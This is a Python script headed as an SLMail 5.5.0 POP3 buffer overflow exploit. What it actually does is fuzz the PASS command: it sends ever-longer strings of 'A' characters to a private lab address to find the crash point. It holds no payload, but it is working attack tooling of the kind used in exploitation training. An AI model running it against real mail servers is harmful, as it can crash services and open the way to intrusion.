#!/usr/bin/env python3

# 
# Exploits buffer overflow for SLMail-5.5.0 over POP3 protocol
#
# Author: Devin Trejo
# Date: 20160408

import socket, sys, os

def main(argv):
    # Client machine IPv4 address
    clientIP = "192.168.56.105"
    clinetPORT = 110

    # Maximum size of PASS buffer sized passed to POP3 server
    MAX_PASS_BUFFER_LEN = 1000

    # Declare a acceptable buffer size that fits into TCP Packet
    BUFFER_SIZE = 1024

    # Define Static username to pass into POP3 protocol USER prompt
    USER = "user"

    # Loop over PASS input sizes 
    for i in range(1 ,MAX_PASS_BUFFER_LEN):
        # Try to connect to passed IP
        try:
            # Create a new socket to the server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((clientIP, clinetPORT))
        except Exception as e:
            print("\n\nConnection could not be made to server.")
            print("Exception: " + str(e))
            s.close()
            return -1

        # Print for debug to console the length of password buffer
        print("Connection to POP3 Server Successful! " +\
            "Testing Password Buffer Size of" + str(i) + " bytes.")

        # Send server username
        s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
        
        # Wait to receive a message
        data = s.recv(BUFFER_SIZE)
        data =  bytes.decode(data, 'UTF-8')
        print("Received data after USER input: \n" + data)

        # Send server password (with long string of A times i)
        s.send(bytes("PASS " + "A"*i + "\r\n", 'UTF-8'))

        # Wait to receive a message
        data = s.recv(BUFFER_SIZE)
        data =  bytes.decode(data, 'UTF-8')
        print("Received data after PASS input: \n" + data)
        
        # Reset connection for next iteration
        s.close()
    return 0


# Run main if tihs is ran as main function. 
if __name__ == "__main__":
    main(sys.argv)
